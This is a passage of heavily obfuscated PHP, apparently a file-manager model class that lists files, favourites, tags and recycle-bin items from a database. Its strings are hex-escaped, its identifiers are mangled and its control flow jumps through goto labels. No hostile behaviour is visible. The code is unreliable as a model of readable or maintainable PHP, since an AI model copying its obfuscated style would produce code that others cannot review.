"\x4d\x6f\x76\x65\x64\40\120\x65\x72\155\141\x6e\145\156\164\x6c\171", "\x33\60\62" => "\x46\157\x75\156\144", "\63\x30\63" => "\x53\145\145\40\117\x74\150\x65\162", "\x33\60\64" => "\x4e\157\x74\x20\115\x6f\x64\151\x66\x69\145\144", "\x33\60\65" => "\x55\163\x65\x20\120\x72\x6f\170\x79", "\63\60\x37" => "\124\145\x6d\x70\x6f\x72\141\162\x79\40\122\x65\x64\x69\x72\145\x63\x74", "\63\x30\x38" => "\120\x65\162\155\141\156\x65\x6e\x74\40\x52\145\144\x69\x72\145\143\x74", "\x34\60\x30" => "\102\x61\144\x20\122\145\x71\x75\x65\163\x74", "\x34\60\61" => "\125\x6e\141\165\x74\x68\x6f\x72\x69\172\145\144", "\64\x30\62" => "\120\141\x79\x6d\145\x6e\x74\40\122\145\161\165\x69\x72\145\x64", "\64\60\x33" => "\106\x6f\162\142\x69\x64\144\x65\156", "\x34\60\64" => "\116\x6f\164\x20\106\x6f\165\x6e\x64", "\x34\60\x35" => "\115\x65\x74\x68\157\x64\40\116\x6f\164\40\x41\x6c\154\x6f\167\145\x64", "\x34\x30\x36" => "\116\x6f\164\40\101\x63\143\x65\160\x74\x61\142\154\145", "\x34\60\67" => "\120\x72\x6f\x78\171\40\101\165\164\x68\145\156\x74\151\x63\141\x74\x69\x6f\x6e\40\x52\x65\x71\165\x69\162\x65\x64", "\64\x30\70" => "\122\145\x71\x75\x65\x73\164\40\x54\151\155\x65\157\x75\164", "\x34\60\x39" => "\103\x6f\156\146\x6c\x69\143\164", "\64\x31\x30" => "\107\157\x6e\145", "\x34\61\x31" => "\x4c\x65\156\x67\x74\x68\x20\122\145\161\x75\151\162\x65\x64", "\x34\61\x32" => "\120\162\145\x63\x6f\x6e\x64\151\164\151\157\156\40\x46\x61\151\154\145\x64", "\64\x31\63" => "\x52\x65\161\x75\x65\163\164\40\105\x6e\164\x69\x74\171\40\124\x6f\157\x20\x4c\141\162\147\x65", "\x34\x31\64" => "\x52\x65\161\165\x65\163\x74\40\125\122\x49\40\124\157\x6f\40\x4c\141\162\x67\145", "\x34\x31\65" => "\125\x6e\x73\x75\x70\x70\x6f\162\164\x65\x64\x20\x4d\145\x64\x69\x61\40\x54\x79\160\x65", "\64\61\66" => "\122\145\161\x75\145\x73\x74\145\144\40\x52\141\156\x67\x65\x20\x4e\157\x74\x20\x53\141\164\151\163\146\x69\x61\x62\x6c\145", "\64\x31\67" => "\105\x78\x70\x65\143\x74\x61\164\151\x6f\156\x20\106\141\151\154\145\144", "\x34\62\x32" => "\125\x6e\160\x72\157\143\x65\163\x73\141\x62\154\x65\40\x45\156\x74\x69\x74\x79", "\x34\x32\x33" => "\114\x6f\143\x6b\x65\144", "\x34\x32\x34" => "\x46\141\151\154\x65\x64\40\x44\x65\160\x65\x6e\144\x65\x6e\143\x79", "\x34\62\x35" => "\125\156\157\x72\144\145\x72\145\x64\40\x43\157\x6c\154\x65\x63\164\x69\157\x6e", "\x34\x32\x36" => "\x55\160\x67\162\141\x64\x65\40\122\x65\x71\x75\151\x72\145\x64", "\x34\62\70" => "\x50\162\145\143\x6f\156\144\151\x74\151\157\x6e\40\x52\145\161\165\x69\162\x65\144", "\64\62\71" => "\x54\157\x6f\x20\115\x61\x6e\171\x20\x52\145\161\165\x65\x73\164\163", "\x34\x33\61" => "\x52\145\x71\x75\x65\x73\x74\40\x48\x65\141\144\x65\x72\40\x46\x69\x65\154\x64\x73\x20\124\x6f\157\x20\114\x61\162\147\145", "\x34\64\64" => "\x4e\x6f\40\x52\145\163\x70\157\156\x73\x65", "\64\x35\60" => "\102\x6c\157\x63\153\x65\x64\x20\x62\x79\x20\x57\151\156\144\157\x77\163\x20\120\141\x72\145\x6e\164\141\154\40\103\x6f\156\164\162\157\154\x73", "\x34\x35\61" => "\x55\x6e\x61\x76\x61\x69\154\141\x62\154\x65\x20\x46\157\x72\x20\x4c\145\147\141\154\x20\122\x65\141\163\157\x6e\163", "\64\x39\x34" => "\122\x65\x71\x75\145\163\x74\40\x48\x65\141\x64\x65\x72\40\124\157\x6f\x20\114\141\162\x67\145", "\x35\x30\x30" => "\111\x6e\164\145\x72\156\x61\x6c\40\123\145\x72\x76\x65\162\x20\105\162\x72\157\162", "\65\60\x31" => "\116\157\164\40\x49\155\x70\154\x65\x6d\145\156\164\145\x64", "\x35\60\x32" => "\x42\x61\x64\x20\107\x61\164\x65\167\141\x79", "\65\60\x33" => "\123\x65\162\x76\x69\143\145\40\125\x6e\x61\166\141\x69\154\141\142\x6c\145", "\x35\60\64" => "\107\141\x74\145\x77\x61\171\x20\x54\151\155\145\157\x75\x74", "\65\60\65" => "\x48\x54\x54\120\40\126\x65\162\163\151\x6f\156\x20\x6e\157\x74\x20\163\x75\160\160\157\x72\164\x65\x64", "\x35\x30\67" => "\111\x6e\163\165\x66\x66\151\x63\151\x65\x6e\x74\x20\123\x74\x6f\x72\x61\x67\x65"); public static function code($b¾«Ü‰Å‚ã) { $fŞÈœÆ˜» =& $_SERVER[…Ò×–]; $b¾«Ü‰Å‚ã = $b¾«Ü‰Å‚ã . $fŞÈœÆ˜»[33]; $f˜×ÄëÔæ‚ = self::$statusCode[$b¾«Ü‰Å‚ã]; $f˜×ÄëÔæ‚ = $f˜×ÄëÔæ‚ ? "\110\x54\x54\120\x2f\x31\x2e\61\40{$b¾«Ü‰Å‚ã}\x20" . $f˜×ÄëÔæ‚ : $fŞÈœÆ˜»[33]; return $f˜×ÄëÔæ‚; } } goto còï½±Œ††; D–ÀÅ—¹»¨: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\162\x63\145"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\155\145" => "\151\x6f\137\x73\157\165\x72\143\145\x5f\x6d\x65\164\141", "\x6d\x65\x74\141\106\151\145\x6c\x64" => "\163\x6f\x75\x72\x63\145\x49\x44"); protected $dataAuto = array(array("\155\157\144\x69\x66\x79\x54\151\155\145", "\164\x69\155\x65", "\x69\156\163\145\162\164", "\146\165\156\x63\164\151\x6f\x6e"), array("\x63\x72\145\141\x74\145\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\x66\165\156\143\x74\151\x6f\x6e"), array("\x76\x69\145\x77\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\156\x73\x65\162\164", "\146\165\156\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($eÉíÙÃÛŒæ) { return $this->listSource(array($_SERVER[…Ò×–][372] => $eÉíÙÃÛŒæ)); } public function typeName($BÈ–´¯·­) { static $eÀ°ö¿ğ‚ù = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\155", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $eÀ°ö¿ğ‚ù[$BÈ–´¯·­ . $_SERVER[…Ò×–][33]]; } public function sourceListInfo($a†áÖÄÙ‰ó, $D›×³øˆ«è = false) { goto FÌ¦ôëÈö†; e¦À–©ø½Ü: if (!$a†áÖÄÙ‰ó) { return array(); } $e‡ƒĞÆàãˆ = $this->where(array($aÏ®Š‡Ñ[373] => array($aÏ®Š‡Ñ[7], $a†áÖÄÙ‰ó)))->select(); $this->_listDataApply($e‡ƒĞÆàãˆ, $D›×³øˆ«è); goto d¿†…ó÷»Ä; FÌ¦ôëÈö†: $aÏ®Š‡Ñ =& $_SERVER[…Ò×–]; $a†áÖÄÙ‰ó = $a†áÖÄÙ‰ó ? $a†áÖÄÙ‰ó : array(); $a†áÖÄÙ‰ó = array_filter(array_unique($a†áÖÄÙ‰ó)); goto e¦À–©ø½Ü; d¿†…ó÷»Ä: return array_to_keyvalue($e‡ƒĞÆàãˆ, $aÏ®Š‡Ñ[373]); goto féÃ ›ƒÁò; féÃ ›ƒÁò: } public function pathInfoFilter($f¡ä¼¹¬è—) { goto e„ˆ×‹ê†; e„ˆ×‹ê†: $Dò›Ûò¯ø“ =& $_SERVER[…Ò×–]; $f¡ä¼¹¬è—[$Dò›Ûò¯ø“[75]] = KodIO::make($f¡ä¼¹¬è—[$Dò›Ûò¯ø“[373]]); $f¡ä¼¹¬è—[$Dò›Ûò¯ø“[29]] = $f¡ä¼¹¬è—[$Dò›Ûò¯ø“[374]] == 1 ? $Dò›Ûò¯ø“[76] : $Dò›Ûò¯ø“[171]; goto AíŒ›Œ‹ƒé; DŞ±ãŒ¨¥î: if (isset($f¡ä¼¹¬è—[$Dò›Ûò¯ø“[380]]) && $f¡ä¼¹¬è—[$Dò›Ûò¯ø“[380]][$Dò›Ûò¯ø“[381]] == -1) { $fßÁ³ËÓğˆ = array_remove_value($fßÁ³ËÓğˆ, $Dò›Ûò¯ø“[191]); $fßÁ³ËÓğˆ = array_remove_value($fßÁ³ËÓğˆ, $Dò›Ûò¯ø“[107]); $fßÁ³ËÓğˆ = array_remove_value($fßÁ³ËÓğˆ, $Dò›Ûò¯ø“[382]); $fßÁ³ËÓğˆ = array_remove_value($fßÁ³ËÓğˆ, $Dò›Ûò¯ø“[383]); $fßÁ³ËÓğˆ = array_remove_value($fßÁ³ËÓğˆ, $Dò›Ûò¯ø“[77]); $fßÁ³ËÓğˆ = array_remove_value($fßÁ³ËÓğˆ, $Dò›Ûò¯ø“[384]); } $f¡ä¼¹¬è— = array_field_key($f¡ä¼¹¬è—, $fßÁ³ËÓğˆ); return $f¡ä¼¹¬è—; goto b‘¬ÆÍÖ; F¿ŒŠõ¸É: $EÑ‰ä†£Ö‘ .= $Dò›Ûò¯ø“[378]; $EÑ‰ä†£Ö‘ .= $Dò›Ûò¯ø“[379]; $fßÁ³ËÓğˆ = explode($Dò›Ûò¯ø“[47], $EÑ‰ä†£Ö‘); goto DŞ±ãŒ¨¥î; AíŒ›Œ‹ƒé: $f¡ä¼¹¬è—[$Dò›Ûò¯ø“[375]] = $this->typeName($f¡ä¼¹¬è—[$Dò›Ûò¯ø“[375]]); if ($f¡ä¼¹¬è—[$Dò›Ûò¯ø“[374]] != 1) { $f¡ä¼¹¬è—[$Dò›Ûò¯ø“[165]] = $f¡ä¼¹¬è—[$Dò›Ûò¯ø“[376]]; unset($f¡ä¼¹¬è—[$Dò›Ûò¯ø“[376]]); } $EÑ‰ä†£Ö‘ = $Dò›Ûò¯ø“[377]; goto F¿ŒŠõ¸É; b‘¬ÆÍÖ: } public function listUserFav() { goto AŠ¸Œ»ÑÁ; A’Œ‡ ®–: foreach ($E›Å®ù« as &$A÷Ëé–¸Ë) { $A÷Ëé–¸Ë = array($AªÎ¿¦Ô [389] => $A÷Ëé–¸Ë[$AªÎ¿¦Ô [371]], $AªÎ¿¦Ô [390] => $A÷Ëé–¸Ë[$AªÎ¿¦Ô [28]], $AªÎ¿¦Ô [391] => $A÷Ëé–¸Ë[$AªÎ¿¦Ô [75]], $AªÎ¿¦Ô [392] => $A÷Ëé–¸Ë[$AªÎ¿¦Ô [29]], $AªÎ¿¦Ô [393] => $A÷Ëé–¸Ë[$AªÎ¿¦Ô [191]], $AªÎ¿¦Ô [394] => $A÷Ëé–¸Ë[$AªÎ¿¦Ô [107]]); if ($A÷Ëé–¸Ë[$AªÎ¿¦Ô [29]] == $AªÎ¿¦Ô [386] && $cÏôô‡–˜[$A÷Ëé–¸Ë[$AªÎ¿¦Ô [75]]]) { $A÷Ëé–¸Ë[$AªÎ¿¦Ô [395]] = $cÏôô‡–˜[$A÷Ëé–¸Ë[$AªÎ¿¦Ô [75]]]; } } unset($A÷Ëé–¸Ë); return $E›Å®ù«; goto dã¶ßÖ”š; AŠ¸Œ»ÑÁ: $AªÎ¿¦Ô  =& $_SERVER[…Ò×–]; $E›Å®ù« = Model($AªÎ¿¦Ô [385])->listData(); $E¨ÔÌàù¼É = array_filter_by_field($E›Å®ù«, $AªÎ¿¦Ô [29], $AªÎ¿¦Ô [386]); goto A˜”«¶Ïƒ; A˜”«¶Ïƒ: $E¨ÔÌàù¼É = array_to_keyvalue($E¨ÔÌàù¼É, $AªÎ¿¦Ô [33], $AªÎ¿¦Ô [75]); if ($E¨ÔÌàù¼É) { $cÏôô‡–˜ = $this->listSource(array($AªÎ¿¦Ô [387] => array($AªÎ¿¦Ô [388], $E¨ÔÌàù¼É))); } $cÏôô‡–˜ = array_to_keyvalue($cÏôô‡–˜[$AªÎ¿¦Ô [358]], $AªÎ¿¦Ô [373]); goto A’Œ‡ ®–; dã¶ßÖ”š: } public function listUserTag($eöä­‰×·Ÿ) { goto eå¢‹Ï®õ…; A’¶î°§ŠØ: if ($AÀÔ‘É«ñÀ) { Model($bàÂŞŸ˜Ş[398])->removeBySource($AÀÔ‘É«ñÀ); } return $Bš³â÷Çœô; goto b¶‚–ª¢æ‘; f„øÍ: foreach ($B¦ñÔ»ŒùÚ as $cö¨µå×¡Ó => $d¹æ¦µ¸‹÷) { $Dä¼©æ÷™ = !0; if (!$eöä­‰×·Ÿ) { $f·íÙ»æÜË[] = $cö¨µå×¡Ó; continue; } foreach ($eöä­‰×·Ÿ as $cŞÏí÷…çÇ) { if (!in_array($cŞÏí÷…çÇ, $d¹æ¦µ¸‹÷)) { $Dä¼©æ÷™ = !1; break; } } if ($Dä¼©æ÷™) { $f·íÙ»æÜË[] = $cö¨µå×¡Ó; } } if (!$f·íÙ»æÜË) { return array(); } $Bš³â÷Çœô = $this->listSource(array($bàÂŞŸ˜Ş[387] => array($bàÂŞŸ˜Ş[388], $f·íÙ»æÜË))); goto b£Ñß®Ï¦¨; D³‰…¯Ş‚¾: $B¦ñÔ»ŒùÚ = array(); foreach ($A±¶†Ú‚ãõ as $aÅ­äˆ£”ì) { $c„¡â­Åñæ = $aÅ­äˆ£”ì[$bàÂŞŸ˜Ş[75]]; if (!$c„¡â­Åñæ) { continue; } if (!isset($B¦ñÔ»ŒùÚ[$c„¡â­Åñæ])) { $B¦ñÔ»ŒùÚ[$c„¡â­Åñæ] = array(); } $B¦ñÔ»ŒùÚ[$c„¡â­Åñæ][] = $aÅ­äˆ£”ì[$bàÂŞŸ˜Ş[397]]; } $f·íÙ»æÜË = array(); goto f„øÍ; Bõ©ƒŒ±îì: $BâãÆÆªª„ = array_to_keyvalue($Bš³â÷Çœô[$bàÂŞŸ˜Ş[73]], $bàÂŞŸ˜Ş[33], $bàÂŞŸ˜Ş[373]); $b§¦Î–¬‘ï = array_merge($BâãÆÆªª„, $f«İàä½­); foreach ($f·íÙ»æÜË as $c„¡â­Åñæ) { if (!in_array($c„¡â­Åñæ, $b§¦Î–¬‘ï)) { $AÀÔ‘É«ñÀ[] = $c„¡â­Åñæ; } } goto A’¶î°§ŠØ; eå¢‹Ï®õ…: $bàÂŞŸ˜Ş =& $_SERVER[…Ò×–]; if ($eöä­‰×·Ÿ && !is_array($eöä­‰×·Ÿ)) { $eöä­‰×·Ÿ = array($eöä­‰×·Ÿ); } $A±¶†Ú‚ãõ = Model($bàÂŞŸ˜Ş[396])->listData(); goto D³‰…¯Ş‚¾; b£Ñß®Ï¦¨: if (!$Bš³â÷Çœô || count($f·íÙ»æÜË) == $Bš³â÷Çœô[$bàÂŞŸ˜Ş[355]][$bàÂŞŸ˜Ş[356]]) { return $Bš³â÷Çœô; } $AÀÔ‘É«ñÀ = array(); $f«İàä½­ = array_to_keyvalue($Bš³â÷Çœô[$bàÂŞŸ˜Ş[74]], $bàÂŞŸ˜Ş[33], $bàÂŞŸ˜Ş[373]); goto Bõ©ƒŒ±îì; b¶‚–ª¢æ‘: } public function listUserRecycle() { $CïÀ¶±Ğ­Ö =& $_SERVER[…Ò×–]; $BÅô‘˜ÀÎÁ = Model($CïÀ¶±Ğ­Ö[399])->listData(); if (!$BÅô‘˜ÀÎÁ) { return array(); } $c‡½öÍÕ¨Ç = array($CïÀ¶±Ğ­Ö[387] => array($CïÀ¶±Ğ­Ö[388], $BÅô‘˜ÀÎÁ), $CïÀ¶±Ğ­Ö[400] => 1); return $this->listSource($c‡½öÍÕ¨Ç); } public function listSource($FÊçÌ ï¸Õ, $Cå¦ÄÕŸƒö = 3000) { goto Eä³Ô¯™öæ; AÄï¹À¹Ò: $aßà®î‚ßĞ = $this->field($B²ÉÎ¸…à)->_makeOrder()->where($FÊçÌ ï¸Õ)->selectPage($Cå¦ÄÕŸƒö); $this->_listDataApply($aßà®î‚ßĞ[$f©§ç…»ìò[358]]); $this->_listMake($aßà®î‚ßĞ); goto BÚ‹âƒ‡˜; Eä³Ô¯™öæ: $f©§ç…»ìò =& $_SERVER[…Ò×–]; if (!isset($FÊçÌ ï¸Õ[$f©§ç…»ìò[401]])) { $FÊçÌ ï¸Õ[$f©§ç…»ìò[401]] = 0; } $B²ÉÎ¸…à = $f©§ç…»ìò[402]; goto AÄï¹À¹Ò; BÚ‹âƒ‡˜: return $aßà®î‚ßĞ; goto D±È¯¢Ò‰; D±È¯¢Ò‰: } protected function _makeOrder() { goto e‡±©²áÂï; e‡±©²áÂï: $e°õÇÎÇ… =& $_SERVER[…Ò×–]; $a‚¼àğ¦» = Model($e°õÇÎÇ…[403])->get($e°õÇÎÇ…[404]); $bæøÇ¤Ğ–´ = Model($e°õÇÎÇ…[403])->get($e°õÇÎÇ…[405]); goto Eğ‡Ô”Ûœà; e‘¶¾Ó¡Ã’: if ($FŒÍÇ»Í == $e°õÇÎÇ…[28]) { } $A©‹É‹Ş²¶ = $e°õÇÎÇ…[413] . $BÃ·ÍêÅ[$FŒÍÇ»Í] . $e°õÇÎÇ…[50] . $e¥Ò‚ïƒ…Ï[$E³ÉÄ™©]; return $this->order(rtrim(trim($A©‹É‹Ş²¶), $e°õÇÎÇ…[47])); goto DÁ­¡ö¡…²; bŞ•¬ˆØÙ‡: $E³ÉÄ™© = Input::get($e°õÇÎÇ…[412], $e°õÇÎÇ…[7], $bæøÇ¤Ğ–´, array_keys($e¥Ò‚ïƒ…Ï)); if (!in_array($FŒÍÇ»Í, array_keys($BÃ·ÍêÅ))) { $FŒÍÇ»Í = $e°õÇÎÇ…[28]; } if (!in_array($E³ÉÄ™©, array_keys($e¥Ò‚ïƒ…Ï))) { $FŒÍÇ»Í = $e°õÇÎÇ…[406]; } goto e‘¶¾Ó¡Ã’; Eğ‡Ô”Ûœà: $e¥Ò‚ïƒ…Ï = array($e°õÇÎÇ…[406] => $e°õÇÎÇ…[407], $e°õÇÎÇ…[408] => $e°õÇÎÇ…[409]); $BÃ·ÍêÅ = array($e°õÇÎÇ…[28] => $e°õÇÎÇ…[28], $e°õÇÎÇ…[77] => $e°õÇÎÇ…[77], $e°õÇÎÇ…[165] => $e°õÇÎÇ…[376], $e°õÇÎÇ…[382] => $e°õÇÎÇ…[382], $e°õÇÎÇ…[410] => $e°õÇÎÇ…[383], $e°õÇÎÇ…[191] => $e°õÇÎÇ…[191], $e°õÇÎÇ…[107] => $e°õÇÎÇ…[107]); $FŒÍÇ»Í = Input::get($e°õÇÎÇ…[411], $e°õÇÎÇ…[7], $a‚¼àğ¦», array_keys($BÃ·ÍêÅ)); goto bŞ•¬ˆØÙ‡; DÁ­¡ö¡…²: } protected function _listDataApplyItem($B²³Ù¥±—Ï, $FîÎÊª–„ = false) { $e²Ï¸×õ›Ò = array($B²³Ù¥±—Ï); $this->_listDataApply($e²Ï¸×õ›Ò, $FîÎÊª–„); return $e²Ï¸×õ›Ò[0]; } protected function _listDataApply(&$dÊ½†çà¿, $fßğ ŠÙùÍ = false) { goto d¾ùê÷™; cñ‹ŠÆ÷Æğ: $C¹³Â–§Ø¨ = array_unique($C¹³Â–§Ø¨); $this->_listSourceCache($dÊ½†çà¿); if (!$fßğ ŠÙùÍ) { $this->_listAppendMeta($dÊ½†çà¿, $C¹³Â–§Ø¨); $this->_listAppendFileMeta($dÊ½†çà¿, $C¹³Â–§Ø¨); $this->_listAppendChildren($dÊ½†çà¿, $C¹³Â–§Ø¨); } goto F»”·†£Š; F»”·†£Š: $this->_listAppendPath($dÊ½†çà¿); $this->_listAppendAuth($dÊ½†çà¿); $this->_listAppendSourceInfo($dÊ½†çà¿, $C¹³Â–§Ø¨); goto fãšë¢´ãÏ; fãšë¢´ãÏ: $this->_listAppendUser($dÊ½†çà¿); $this->_listFilterInfo($dÊ½†çà¿, $fßğ ŠÙùÍ); goto b­Ÿ¶Ãæ°®; d¾ùê÷™: $a¶§ŞŠÏµ¹ =& $_SERVER[…Ò×–]; if (!$dÊ½†çà¿) { $dÊ½†çà¿ = array(); return; } $C¹³Â–§Ø¨ = array_to_keyvalue($dÊ½†çà¿, $a¶§ŞŠÏµ¹[33], $a¶§ŞŠÏµ¹[373]); goto cñ‹ŠÆ÷Æğ; b­Ÿ¶Ãæ°®: } protected function _listSourceCache($bå²—î½¢†) { $E©¯¯ĞÜ =& $_SERVER[…Ò×–]; foreach ($bå²—î½¢† as $c²—­™´Ä) { self::$cacheSourceInfo[$E©¯¯ĞÜ[414] . $c²—­™´Ä[$E©¯¯ĞÜ[373]]] = $c²—­™´Ä; } } protected function _listFilterInfo(&$Bªß‹¹‹Ò, $Fäó½Ê¨´ = false) { $bñ¶¨ÄÎß¾ =& $_SERVER[…Ò×–]; foreach ($Bªß‹¹‹Ò as &$DŞáìŸµ’) { $DŞáìŸµ’ = $this->pathInfoFilter($DŞáìŸµ’); self::$cachePathInfo[$bñ¶¨ÄÎß¾[415] . intval($Fäó½Ê¨´) . $bñ¶¨ÄÎß¾[416] . $DŞáìŸµ’[$bñ¶¨ÄÎß¾[373]]] = $DŞáìŸµ’; } unset($DŞáìŸµ’); } protected function _listMake(&$e•ß‹¡·¬ò) { $fëùšéˆ›ã =& $_SERVER[…Ò×–]; $e•ß‹¡·¬ò[$fëùšéˆ›ã[74]] = array(); $e•ß‹¡·¬ò[$fëùšéˆ›ã[73]] = array(); foreach ($e•ß‹¡·¬ò[$fëùšéˆ›ã[358]] as $eÔî¯ˆÍ³¶) { $Dœœ±“™Ô‹ = $eÔî¯ˆÍ³¶[$fëùšéˆ›ã[374]] == 1 ? $fëùšéˆ›ã[74] : $fëùšéˆ›ã[73]; $e•ß‹¡·¬ò[$Dœœ±“™Ô‹][] = $eÔî¯ˆÍ³¶; } unset($e•ß‹¡·¬ò[$fëùšéˆ›ã[358]]); } protected function _listAppendMeta(&$FÊÅì‘ÄÄ, $C«°œ„’õ¨) { goto d•Ú…œ–‰É; d•Ú…œ–‰É: $DÀÍƒàÛì =& $_SERVER[…Ò×–]; $fïÈ™ÛÁ™² = array($DÀÍƒàÛì[387] => array($DÀÍƒàÛì[388], $C«°œ„’õ¨)); $B°÷‹éó§– = Model($DÀÍƒàÛì[417])->field($DÀÍƒàÛì[418])->where($fïÈ™ÛÁ™²)->select(); goto A·¡µ‰ŠÉ·; A·¡µ‰ŠÉ·: if (!$B°÷‹éó§–) { return; } $DùééÔˆä = array($DÀÍƒàÛì[419], $DÀÍƒàÛì[420]); $d‘µŠÑ·ÁË = array(); goto eÓù•¯ÀÅ; eÓù•¯ÀÅ: foreach ($B°÷‹éó§– as $CäóùÑÑ) { if (!isset($d‘µŠÑ·ÁË[$CäóùÑÑ[$DÀÍƒàÛì[373]]])) { $d‘µŠÑ·ÁË[$CäóùÑÑ[$DÀÍƒàÛì[373]]] = array(); } if (in_array($CäóùÑÑ[$DÀÍƒàÛì[89]], $DùééÔˆä)) { continue; } $d‘µŠÑ·ÁË[$CäóùÑÑ[$DÀÍƒàÛì[373]]][$CäóùÑÑ[$DÀÍƒàÛì[89]]] = $CäóùÑÑ[$DÀÍƒàÛì[363]]; } foreach ($FÊÅì‘ÄÄ as &$c—Üåõ´Æ¤) { $c—Üåõ´Æ¤[$DÀÍƒàÛì[421]] = !1; if (isset($d‘µŠÑ·ÁË[$c—Üåõ´Æ¤[$DÀÍƒàÛì[373]]])) { $c—Üåõ´Æ¤[$DÀÍƒàÛì[421]] = $d‘µŠÑ·ÁË[$c—Üåõ´Æ¤[$DÀÍƒàÛì[373]]]; } if ($this->fileIsLock($c—Üåõ´Æ¤) && $c—Üåõ´Æ¤[$DÀÍƒàÛì[380]]) { $E‹ññ°‡ë¸ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $c—Üåõ´Æ¤[$DÀÍƒàÛì[380]][$DÀÍƒàÛì[381]] = AuthModel::authDisable($c—Üåõ´Æ¤[$DÀÍƒàÛì[380]][$DÀÍƒàÛì[381]], $E‹ññ°‡ë¸); $c—Üåõ´Æ¤[$DÀÍƒàÛì[380]][$DÀÍƒàÛì[422]][$DÀÍƒàÛì[380]] = $c—Üåõ´Æ¤[$DÀÍƒàÛì[380]][$DÀÍƒàÛì[381]]; } } unset($c—Üåõ´Æ¤); goto d®ÒÖóÛõ•; d®ÒÖóÛõ•: } protected function _listAppendFileMeta(&$E“•¯âã¸, $b’ğ „Ñ³) { goto Aáˆ¬Ìé‘¥; B‹Û³œÖ¸™: $eÎó‡éÏ¨ = $eÎó‡éÏ¨ ? $eÎó‡éÏ¨ : array(); $dÍˆò®Ó¥Ú = array(); foreach ($eÎó‡éÏ¨ as $fˆ²‰Ñ®š‹) { if (!isset($dÍˆò®Ó¥Ú[$fˆ²‰Ñ®š‹[$F”©ñÃ³‡Ü[423]]])) { $dÍˆò®Ó¥Ú[$fˆ²‰Ñ®š‹[$F”©ñÃ³‡Ü[423]]] = array(); } $dÍˆò®Ó¥Ú[$fˆ²‰Ñ®š‹[$F”©ñÃ³‡Ü[423]]][$fˆ²‰Ñ®š‹[$F”©ñÃ³‡Ü[89]]] = $fˆ²‰Ñ®š‹[$F”©ñÃ³‡Ü[363]]; } goto C“¡È­ÃÃ; C“¡È­ÃÃ: foreach ($E“•¯âã¸ as &$D¿ƒÚÕ¸ôò) { goto aæ‘Š¥¹»Î; bãØ¨åòÄ“: unset($bÇª°®¤«ã[$F‡î³­³İä][$F”©ñÃ³‡Ü[75]]); $FÊßÜÏ»ˆ = is_array($dÍˆò®Ó¥Ú[$F‡î³­³İä]) ? $dÍˆò®Ó¥Ú[$F‡î³­³İä] : array(); $D¿ƒÚÕ¸ôò[$F”©ñÃ³‡Ü[161]] = array_merge($FÊßÜÏ»ˆ, $bÇª°®¤«ã[$F‡î³­³İä]); goto a¾Î³·ºœ¤; aæ‘Š¥¹»Î: $F‡î³­³İä = $D¿ƒÚÕ¸ôò[$F”©ñÃ³‡Ü[423]]; if (!$F‡î³­³İä || !isset($bÇª°®¤«ã[$F‡î³­³İä])) { continue; } $A®Ëñšéâ˜ = $bÇª°®¤«ã[$F‡î³­³İä]; goto D•ˆœªƒ«¬; D•ˆœªƒ«¬: $A®Ëñšéâ˜[$F”©ñÃ³‡Ü[77]] = $D¿ƒÚÕ¸ôò[$F”©ñÃ³‡Ü[77]]; $A®Ëñšéâ˜[$F”©ñÃ³‡Ü[28]] = $D¿ƒÚÕ¸ôò[$F”©ñÃ³‡Ü[28]]; if (!isset(self::$cacheFileInfo[$F”©ñÃ³‡Ü[429] . $F‡î³­³İä])) { self::$cacheFileInfo[$F”©ñÃ³‡Ü[429] . $F‡î³­³İä] = array_merge(array(), $A®Ëñšéâ˜); } goto bãØ¨åòÄ“; a¾Î³·ºœ¤: if (isset($D¿ƒÚÕ¸ôò[$F”©ñÃ³‡Ü[161]][$F”©ñÃ³‡Ü[160]])) { $D¿ƒÚÕ¸ôò[$F”©ñÃ³‡Ü[160]] = json_decode($D¿ƒÚÕ¸ôò[$F”©ñÃ³‡Ü[161]][$F”©ñÃ³‡Ü[160]], !0); unset($D¿ƒÚÕ¸ôò[$F”©ñÃ³‡Ü[161]][$F”©ñÃ³‡Ü[160]]); } goto BÅ÷™Éİ° ; BÅ÷™Éİ° : } unset($D¿ƒÚÕ¸ôò); goto E»³‹Ğ„™…; Aáˆ¬Ìé‘¥: $F”©ñÃ³‡Ü =& $_SERVER[…Ò×–]; $E³’…Ù–Ã = array_to_keyvalue($E“•¯âã¸, $F”©ñÃ³‡Ü[33], $F”©ñÃ³‡Ü[423]); $E³’…Ù–Ã = array_filter(array_unique($E³’…Ù–Ã)); goto dÆ‘ë“¶«; dš‡¼éÒ¦ä: $bÇª°®¤«ã = Model($F”©ñÃ³‡Ü[426])->field($C¬ê–ãğº)->where($F¶¯Ëœå)->select(); $bÇª°®¤«ã = array_to_keyvalue($bÇª°®¤«ã, $F”©ñÃ³‡Ü[423]); $eÎó‡éÏ¨ = Model($F”©ñÃ³‡Ü[427])->field($F”©ñÃ³‡Ü[428])->where($F¶¯Ëœå)->select(); goto B‹Û³œÖ¸™; dÆ‘ë“¶«: if (!$E³’…Ù–Ã) { return; } $F¶¯Ëœå = array($F”©ñÃ³‡Ü[424] => array($F”©ñÃ³‡Ü[388], $E³’…Ù–Ã)); $C¬ê–ãğº = $F”©ñÃ³‡Ü[425]; goto dš‡¼éÒ¦ä; E»³‹Ğ„™…: } protected function _listAppendSourceInfo(&$bËÂ‚÷£ËÂ, $BçÚôòµÑí) { goto a™ÅÅëã; DåÂ‰¿“‘: $AÆ„¡áÄ¢Ğ = Model($aºŒğŸ±¸[396])->listData(); $e›ŠÒ‘ŠÏŠ = Model($aºŒğŸ±¸[385])->listData(); $FÁæŠ˜Â¶ = Model($aºŒğŸ±¸[432])->listSimple(); goto EÈøÓÂÜ‰°; a™ÅÅëã: $aºŒğŸ±¸ =& $_SERVER[…Ò×–]; if (!defined($aºŒğŸ±¸[430])) { return; } $BàÏÎ•šš¬ = Model($aºŒğŸ±¸[431])->listData(); goto DåÂ‰¿“‘; cÏÉ¹æ†Î“: $bÜ·¹«Ş‚ = array_to_keyvalue_group($FÁæŠ˜Â¶, $aºŒğŸ±¸[373]); foreach 